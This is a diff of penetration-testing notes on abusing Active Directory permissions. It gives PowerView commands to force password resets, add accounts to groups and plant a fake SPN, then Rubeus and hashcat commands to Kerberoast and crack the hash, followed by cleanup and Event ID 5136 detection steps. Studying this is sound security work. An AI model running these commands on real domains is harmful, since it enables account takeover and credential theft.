@@ -1,126 +1,104 @@
-## Force Password Change via PowerView
+# ACL Abuse Tactics
 
-When you control a user with permissions to reset a target's password and need to pivot to that account.
+Cleanup order matters: remove fake SPN first → then remove from group → then reset password. Reversing the order breaks your own access mid-cleanup.
 
-1. Create a credential object for the account you currently control
+---
 
-```
-$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
-```
+## Step 1 — ForceChangePassword (wley → damundsen)
 
-2. Create a secure string for the new password to be assigned to the target
+Authenticate as your controlled user via PSCredential object:
 
-```
-$TargetPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+```powershell
+$SecPassword = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
 ```
 
-3. Execute the password reset
+Force change the target user's password:
 
-```
-Set-DomainUserPassword -Identity <USERNAME> -AccountPassword $TargetPassword -Credential $Cred -Verbose
-```
-
-Tool comparison
-
-- PowerView -> `Set-DomainUserPassword` -> Preferred for native execution on Windows targets
-- pth-toolkit -> `pth-net` -> Preferred for execution from Linux attack hosts
-
-Gotchas **Missing -Verbose flag** prevents receiving confirmation of success or detailed error data required for troubleshooting.
-
-## Group Membership Modification
-
-When a controlled account has rights to modify group membership to escalate privileges or inherit rights via **nested group membership**.
-
-Check current group members to confirm current state
-
-```
-Get-DomainGroupMember -Identity "<GROUP_NAME>" | Select MemberName
+```powershell
+$NewPass = ConvertTo-SecureString '<NEWPASS>' -AsPlainText -Force
+Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPass -Credential $Cred -Verbose
 ```
 
-Alternative check using AD module
+> [!warning] ForceChangePassword is destructive — get written approval before running. If the target is an admin account being actively used, coordinate with the client or use targeted Kerberoasting instead.
 
-```
-Get-ADGroup -Identity "<GROUP_NAME>" -Properties * | Select -ExpandProperty Members
-```
+---
 
-Add a user to the target group
+## Step 2 — GenericWrite → Add Self to Group (damundsen → Help Desk Level 1)
 
-```
-Add-DomainGroupMember -Identity '<GROUP_NAME>' -Members '<USERNAME>' -Credential $Cred -Verbose
-```
+Create new cred object as the newly controlled user:
 
-Remove a user from the group during cleanup
-
-```
-Remove-DomainGroupMember -Identity "<GROUP_NAME>" -Members '<USERNAME>' -Credential $Cred -Verbose
+```powershell
+$SecPassword2 = ConvertTo-SecureString '<NEWPASS>' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<TARGET_USER>', $SecPassword2)
 ```
 
-Tool comparison
+Add user to the group:
 
-- PowerView -> `Add-DomainGroupMember` -> Standard Windows-based membership modification
-- pth-toolkit -> `pth-net` -> Linux-based alternative for group modification
-
-Gotchas **Removing the user before clearing attributes** like a fake SPN will result in losing the permissions required to finish cleanup.
-
-## Targeted Kerberoasting via SPN Injection
-
-When you have **GenericAll** or **GenericWrite** rights over an account and want to obtain a crackable hash without changing the user's password.
-
-Inject a fake SPN into the target object
-
-```
-Set-DomainObject -Credential $Cred -Identity <USERNAME> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```powershell
+Add-DomainGroupMember -Identity '<GROUP>' -Members '<TARGET_USER>' -Credential $Cred2 -Verbose
 ```
 
-Remove the fake SPN after the hash is captured
+Confirm membership:
 
-```
-Set-DomainObject -Credential $Cred -Identity <USERNAME> -Clear serviceprincipalname -Verbose
-```
-
-Tool comparison
-
-- PowerView -> `Set-DomainObject` -> Manual attribute modification
-- targetedKerberoast -> `targetedKerberoast` -> Preferred on Linux to automate SPN creation, hash retrieval, and cleanup in one command
-
-Dangerous / misconfigured settings
-
-- **GenericAll** rights on high-privilege users or service accounts
-- **GenericWrite** rights on high-privilege users or service accounts
-
-Gotchas **Service interruption** is avoided by using this method instead of a password reset for admin accounts.
-
-## Kerberoasting with Rubeus
-
-When an account has a **servicePrincipalName** set and you need to retrieve a TGS ticket for offline cracking.
-
-Request the TGS and return the hash for the specified user
-
-```
-.\Rubeus.exe kerberoast /user:<USERNAME> /nowrap
+```powershell
+Get-DomainGroupMember -Identity "<GROUP>" | Select MemberName
 ```
 
-Gotchas **AES-enabled accounts** return AES hashes by default; use `/ticket:X` or `/tgtdeleg` to force **RC4_HMAC** if the cracker does not support AES.
+---
 
-## SDDL Analysis for Detection
+## Step 3 — GenericAll → Targeted Kerberoast (IT group → adunn)
 
-When investigating **Event ID 5136** to identify which specific rights were granted during a suspected ACL abuse attempt.
+Set a fake SPN on the target user to make them Kerberoastable:
 
-Convert the raw SDDL string from the event log into a readable object
-
-```
-ConvertFrom-SddlString "<SDDL_STRING>"
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity <TARGET_USER> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 ```
 
-Filter for the **DiscretionaryAcl** to see specific permissions granted
+Kerberoast the now-SPN-enabled account:
 
+```powershell
+.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap
 ```
+
+Crack offline:
+
+```bash
+hashcat -m 13100 <HASH_FILE> <WORDLIST>
+```
+
+---
+
+## Cleanup (in order)
+
+Remove fake SPN first — before losing group membership:
+
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity <TARGET_USER> -Clear serviceprincipalname -Verbose
+```
+
+Remove from group:
+
+```powershell
+Remove-DomainGroupMember -Identity "<GROUP>" -Members '<USER>' -Credential $Cred2 -Verbose
+```
+
+Verify removal:
+
+```powershell
+Get-DomainGroupMember -Identity "<GROUP>" | Select MemberName | ? {$_.MemberName -eq '<USER>'}
+```
+
+Then reset the password for any account you force-changed, or have the client do it.
+
+---
+
+## Detection
+
+Event ID 5136 (directory service object modified) — fires on ACL changes, SPN writes, group membership changes. SDDL format — parse with:
+
+```powershell
 ConvertFrom-SddlString "<SDDL_STRING>" | select -ExpandProperty DiscretionaryAcl
 ```
 
-Edge cases
-
-- **GenericWrite** privileges over the domain object itself can indicate a high-level compromise attempt.
-
-Gotchas **SDDL strings** are not human-readable in the raw Event Viewer output and require conversion for analysis.
+Group membership changes on privileged groups should alert immediately. Any non-standard SPN appearing on a user account (especially admins) is a red flag.
